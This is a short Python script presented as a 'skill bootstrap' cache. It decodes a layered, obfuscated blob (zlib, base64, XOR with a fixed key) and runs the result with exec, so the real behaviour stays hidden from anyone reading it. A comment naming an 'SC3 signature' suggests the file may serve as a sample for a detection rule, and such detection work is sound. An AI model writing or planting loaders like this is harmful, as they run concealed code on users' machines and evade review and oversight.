#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9U0ubqjoQ/EEuBA1ndHEXPBIgHFGCQsiOl0QJgkPuF8Zff+LMuXfZXyfVVdXVFO0/6dSEWyEs9iVimPA+t8zjkJHVsVMRzVROx+k4IGZGOXY8Mj8oMA/CkV27OSC4QHEGKNy+YJmL/Uf0mrH7S87SF24CsaSvwimfznpcZlBtREnVOJ9ncn0gYVY5jn0TiHOILpzI29XnNeIHbkugVsusopRx37E/8wKWPWp2EWWl33WSYISNDK/aBy5dbqhklJeOy77Im5oqxTXNcEC8jygOoIN7re/6fq9rG3Vmn4f78yOrV/ZXEVITJAnQ+L11azex75pAEoazXkx94QufLoclx3YpMnzX/VPQqc61iMYnN20O9smsLjNhD5Hdr1Qz47bKD6R6mLsySjX+0mn+8VXrm9gjLulSP9/8uOb3xvcQEGkhT7r/YgM/ok5N6eScH+KiWkoC2AGNN5ZTFpsRjSu/W/oEaDE//hSexk0n9N7XrQiWt5+cFii8wT0ofH56z3MtJx1gp9ohrjyn/iT1qFYb3Q8uYUDCzzTcld/9vCk9Z+5cwDzjsgeVy7DvzE+6i7Xfe0vr/+0u9ZfeX/4Qk1EFSRh0U5+GMhdE3q/6v2s6R7cuipWJ920udA22dGRRZ5JXFWRVQ5Oq+mWOMuAwQY6kRtzbK1Aa2sdosz9BAjcav9L7eeuPXVLrfNblgL79bQJ7lCSc8BeXRhFkpc97kRf2//lAHG5cEJ96KIx20zhQmWt3V6hv/JQcoa3u58kub4iI9os5MDFUzhDjGV6zrfaDKz1P40H+8e3fT15PnbBuUe4EXgaM88ToAPn9Ox+UyLC1WoEMxXw9L2MStn/13NjHCe5XrtWcekPe2JDFnm0+9byLQWy9DyuGC7auFjsJD6p3Xjx7HnKL6fxZ9/bGdb6d+Vyzay/idZSis+NCu/hk63nYM+1dZgvRozrJeMY6LESFnHokH7IdoDDLB3ZcIp8EyMZY6p88mlbv7pIffv/VVpMK7V+M3vckRxe8a/4R6+OByuD2v0ANWl8mhB/o+2x+z+XLLlRkii3kO0kqKQwF/+b9IJJxTDce/OcPttx3Vg=="
_K = bytes.fromhex("7f7e442be43af13b10090628")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
